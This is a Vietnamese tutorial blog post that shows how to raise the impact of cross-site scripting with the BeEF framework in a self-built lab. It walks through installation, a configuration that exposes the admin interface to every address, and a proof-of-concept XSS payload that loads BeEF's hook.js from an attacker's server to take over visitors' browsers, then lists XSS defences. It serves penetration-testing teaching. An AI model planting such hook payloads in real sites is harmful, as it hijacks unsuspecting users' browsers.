![](https://images.viblo.asia/4247fc13-98d0-44b0-bbc3-5c8bcbb8df8a.jpg)

Trong quá trình thực hiện kiểm tra bảo mật,  [Cross-site scripting (XSS)](https://owasp.org/www-community/attacks/xss/) có lẽ là một trong những lỗ hổng phổ biến nhất mà chúng ta  gặp phải. Để minh chứng mức độ ảnh hưởng của nó,Pentester thường chèn các script độc hại để website mục tiêu *alert* lên những nội dung chỉ định trước hoặc chuyển hướng và thay đổi giao diện của website. 

Tuy nghiêm trọng là vậy, nhưng XSS lại thường không được đánh giá cao. Trong mắt khách hàng và nhiều người nó vẫn được coi như một lỗ hổng nhỏ, không quá quan trọng. Qua bài viết sau đây, chúng ta sẽ cùng nhau tìm hiểu,nâng cấp mức độ ảnh hưởng của nó với BeEF Framework

# 1. Tổng Quan 

![](https://images.viblo.asia/f4d57ad1-9373-4e76-971d-eb0908ab5604.jpg)

BeEF là viết tắt của Browser Exploitation Framework. Nó là một công cụ kiểm tra thâm nhập tập trung vào trình duyệt web. Người dùng có thể xây dựng các kịch bản tấn công và qua đó đánh giá mức độ bảo mật của một trang web.



**Mô hình mình đưa ra bao gồm 3 thành phần chính**:

+ **Server A**: bị ảnh hưởng bởi lỗ hổng Cross-site scripting (XSS) (*sử dụng Apache và chạy trên EC2 AWS*)
+ **Server B**: Sử dụng BeEF Framework đóng vai trò như một máy chủ khai thác (*xây dựng trên GCP Cloud*).
+ **Client C**: Đóng vai trò như một người dùng thông thường, truy cập vào Server A.



**Kịch bản:** 

`Server A bị ảnh hưởng bởi lỗ hổng Cross-site scripting (XSS), Hacker chèn các đoạn mã độc hại được cung cấp bởi BeEF Framework của Server B để tấn công Client C.`

# 2. Xây dựng môi trường 
**2.1. Server A bị ảnh hưởng bởi Cross-site scripting (XSS)**

**Requirements**
> Operating System: Mac OSX / Linux / Windows.
> 
> Apache or Nginx.

**Cài đặt Apache2**
```bash
sudo apt-get update;sudo apt-get upgrade
sudo apt-get install -y apache2
```

*Để mô phỏng lỗ hổng một cách nhanh chóng nhất, ở đây mình sẽ chèn trực tiếp các đoạn mã độc hại vào index.html của Apache thông qua SSH.*


Payload:  `<script>alert('Test Script')</script>`

**Kết quả :**

![](https://images.viblo.asia/4b9f713a-e93b-49b4-8b33-651cdfbb10f3.jpg)


**2.2. Cài đặt BeEF Framework** (Server B)

**Requirements**
> 
> Operating System: Mac OSX 10.5.0 or higher / modern Linux. Note: Windows is not supported.
> 
> Ruby: 2.5 or newer
> 
> SQLite: 3.x
> 
> Node.js: 10 or newer
> 
> The gems listed in the Gemfile: https://github.com/beefproject/beef/blob/master/Gemfile
> 
> Selenium is required on OSX: brew install selenium-server-standalone (See https://github.com/shvets/selenium)


**Cài đặt Ruby**

```bash
sudo apt-get install software-properties-common
```

```bash
sudo apt-get update
```

```bash
sudo apt-add-repository -y ppa:brightbox/ruby-ng
```
**Cài đặt RVM**

   ```bash 
   sudo apt-add-repository -y ppa:rael-gc/rvm
   ```
   
   ```bash 
   sudo apt-get update;sudo apt-get install rvm
   ```
   
   ```bash 
rvm install "ruby-2.5.3"
echo 'source "/etc/profile.d/rvm.sh"' >> ~/.bashrc    
   ```

**Cài đặt các gói cần thiết khác**

```bash
 sudo add-apt-repository ppa:jonathonf/gcc-9.0
 sudo apt-get update
 sudo apt-get install gcc-9
 sudo apt-get install git curl wget -y
```

**Download and running BeEF Framework**

```bash
git clone https://github.com/beefproject/beef
cd beef
./install 
./beef 
```


*BeEF Framework không cho phép sử dụng với mật khẩu mặc định, để thay đổi điều này, ta tiến hành cấu hình trong config.yaml*

```
    # Credentials to authenticate in BeEF.
    # Used by both the RESTful API and the Admin interface
    credentials:
        user:   "admin"
        passwd: "admin@123"

    # Interface / IP restrictions
    restrictions:
        # subnet of IP addresses that can hook to the framework
        permitted_hooking_subnet: ["0.0.0.0/0", "::/0"]
        # subnet of IP addresses that can connect to the admin UI
        #permitted_ui_subnet: ["127.0.0.1/32", "::1/128"]
        permitted_ui_subnet: ["0.0.0.0/0", "::/0"]
        # slow API calls to 1 every  api_attempt_delay  seconds
        api_attempt_delay: "0.05"

    # HTTP server
    http:
        debug: false #Thin::Logging.debug, very verbose. Prints also full exception stack trace.
        host: "0.0.0.0"
        port: "8080"

```


**Kết quả**

![](https://images.viblo.asia/09c69b59-e140-47a2-9e59-694c9bb262ff.jpg)

> Tips: Nếu sau khi cài đặt thành công, bạn vẫn không thể truy cập vào BeEF Framework thì có thể bạn cần mở port thông qua iptables.
# 3. Proof of concept
**Bước 1**. Tạo mã độc hại bằng BeEF Framework.

BeEF Framework mặc được trang bị một đoạn mã Javascript vô cùng "xịn xò" mang tên hook.js .Bạn có thể tìm thấy nó tại http://you-ip/hook.js 


**Bước 2.** Nhúng mã hook.js vào Server A  

`Payload:  <script src=”http://your-ip/hook.js” type=”text/javascript”></script>`

**Bước 3**. Client C truy cập vào server A và nhanh chóng biến thành Zoombie 

![](https://images.viblo.asia/1bba5740-5d5f-42e1-a4e8-cc73ba6beff2.gif)


# 4. Phòng chống Cross-site scripting
Để giảm thiểu nguy cơ hệ thống của bạn bị ảnh hưởng bởi Cross-site scripting (XSS) ta thực hiện theo 7 bước sau đây: 

> **Bước 1.Đào tạo duy trì nhận thức bảo mật:**
> Để giữ cho ứng dụng web của bạn an toàn, mọi người tham gia xây dựng ứng dụng web phải nhận thức được những rủi ro liên quan đến các lỗ hổng XSS. Bạn nên cung cấp khóa đào tạo bảo mật phù hợp cho tất cả các nhà phát triển, nhân viên QA, DevOps và SysAdmins của mình. 
> 
> **Bước 2. Không tin tưởng bất kỳ đầu vào của người dùng:**
> Coi tất cả những gì người dùng nhập vào là không đáng tin cậy. Bất kỳ đầu vào nào của người dùng đều dẫn đến rủi ro về XSS và cần phải xử lý.
> 
> **Bước 3:  Sử dụng escaping/encoding:**
> Sử dụng kỹ thuật escaping/encoding thích hợp tùy thuộc vào vị trí sử dụng dữ liệu đầu vào của người dùng: escaping HTML, escaping JavaScript, escaping CSS, escaping URL, v.v. Sử dụng thư viện hiện có để escaping, không viết thư của riêng bạn trừ khi thực sự cần thiết.
> 
> **Bước 4: Sanitize HTML**
> Nếu đầu vào của người dùng cần chứa HTML, bạn không thể thực hiện kỹ thuật escaping/encoding nó vì nó sẽ phá vỡ các thẻ hợp lệ. Trong  trường hợp như vậy, hãy sử dụng thư viện đáng tin cậy và đã được xác minh để phân tích cú pháp và làm sạch HTML. Chọn thư viện tùy thuộc vào ngôn ngữ phát triển của bạn, ví dụ: HtmlSanitizer cho .NET hoặc SanifyingHelper cho Ruby on Rails.
> 
> **Bước 5. Đặt cờ HttpOnly:**
> Để giảm thiểu hậu quả của lỗ hổng XSS có thể xảy ra, hãy đặt cờ HttpOnly cho cookie. Nếu bạn làm vậy, những cookie đó sẽ không thể truy cập được qua JavaScript phía máy khách.
> 
> **Bước 6. Sử dụng Content Security Policy (CSP):**
> Để giảm thiểu hậu quả của lỗ hổng XSS có thể xảy ra, hãy sử dụng Content Security Policy (CSP). CSP là một tiêu đề phản hồi HTTP cho phép bạn khai báo các tài nguyên động được phép tải tùy thuộc vào nguồn yêu cầu.
> 
> **Bước 7. Thường xuyên kiểm tra định kỳ bảo mật cho Website**
> 
# 5. Tổng kết
Qua đây chúng ta đã cùng nhau tìm hiểu các kiến thức cơ bản nhất của BeEF Framework. Hi vọng sau bài viết, chúng ta sẽ có cái nhìn đúng đắn hơn về mức độ nghiêm trọng của Cross Site Scripting (XSS). Hẹn gặp lại các bạn trong những bài chia sẻ khác. 

Tham khảo:

https://github.com/rvm/ubuntu_rvm

https://github.com/beefproject/beef/wiki/

https://owasp.org/www-community/attacks/xss/